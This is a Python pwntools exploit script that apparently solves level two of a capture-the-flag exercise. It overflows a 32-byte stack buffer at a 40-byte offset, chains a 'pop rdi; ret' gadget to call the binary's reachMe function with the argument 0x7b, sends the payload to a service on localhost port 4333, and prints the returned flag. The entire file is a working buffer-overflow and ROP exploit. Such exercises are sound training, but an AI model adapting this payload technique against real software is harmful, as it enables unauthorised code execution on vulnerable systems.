#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.endian = "little"
context.log_level = "debug"

LVL_TWO_BINARY_PATH = "./lvl_2"
elf = ELF(LVL_TWO_BINARY_PATH)

CONNECTION_HOST = "localhost"
LVL_2_PORT = 4333

RIP_OFFSET = 40  # 32-byte buffer + 8-byte saved RBP

# Addresses from the binary
reachMe_address = elf.symbols["reachMe"]
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address

target_argument = 0x7B  # from the cmpq $0x7b
# Function only calls the flag if it's called
# as reachMe(0x7b) = reachMe(123).

log.info(f"reachMe   = {hex(reachMe_address)}")
log.info(f"pop rdi;ret gadget = {hex(pop_rdi)}")
log.info(f"argument  = {hex(target_argument)}")

# Build payload
payload = b"A" * RIP_OFFSET
payload += p64(pop_rdi)  # gadget: pop next value into rdi, then ret
payload += p64(target_argument)  # this becomes rdi
payload += p64(reachMe_address)  # ret into reachMe(rdi=0x7b)
payload += b"\n"

# Send payload
remote_connection = remote(CONNECTION_HOST, LVL_2_PORT)

print("Receiving welcome message...")
try:
    welcome_message = remote_connection.recvline(timeout=2)
    print(f"Welcome: {welcome_message}")
except Exception:
    print("No banner / welcome line")

print(f"Sending payload length: {len(payload)}")
remote_connection.send(payload)

print("Attempting to receive flag...")
try:
    lvl_2_flag = remote_connection.recvline(timeout=2)
    print(f"Flag (Level II): {lvl_2_flag}")
except Exception:
    print("No response (maybe check offset/gadgets?)")

remote_connection.close()
